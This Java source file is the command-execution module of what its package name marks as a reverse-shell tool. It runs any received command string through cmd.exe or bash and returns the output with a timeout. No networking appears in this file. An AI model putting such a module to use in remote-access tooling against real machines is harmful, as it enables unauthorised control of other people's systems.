/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package obs1d1anc1ph3r.reverseshell;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.concurrent.TimeUnit;
import obs1d1anc1ph3r.reverseshell.plugins.CDCommand;

public class CommandExecutor {

	//Comand executor
	public String executeCommand(String command) {
		StringBuilder output = new StringBuilder();
		//ToDo -- Make the os, shell, and shell flag fixed variables, so it only has to figure it out once
		try {
			String os = System.getProperty("os.name").toLowerCase();
			String shell;
			String shellFlag;
			if (os.contains("win")) {
				shell = "cmd.exe";
				shellFlag = "/c";
			} else {
				shell = "/bin/bash";
				shellFlag = "-c";
			}

			//Make the command
			ProcessBuilder processBuilder = new ProcessBuilder(shell, shellFlag, command);
			processBuilder.redirectErrorStream(true);
			processBuilder.directory(new File(CDCommand.getCurrentDirectory()));
			Process process = processBuilder.start();

			try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
				String line;
				while ((line = reader.readLine()) != null) {
					output.append(line).append("\n");
				}
			}
			//If no worky, then say fuck it and give up :)
			boolean finished = process.waitFor(10, TimeUnit.SECONDS);
			if (!finished) {
				process.destroy();
				return "Error: Command timed out.";
			}

			int exitCode = process.exitValue();
			if (exitCode != 0) {
				return "Error executing command, exit code: " + exitCode;
			}

		} catch (IOException | InterruptedException e) {
			return "Error executing command: " + e.getMessage();
		}
		//Return the thing
		return output.toString().trim();
	}

}
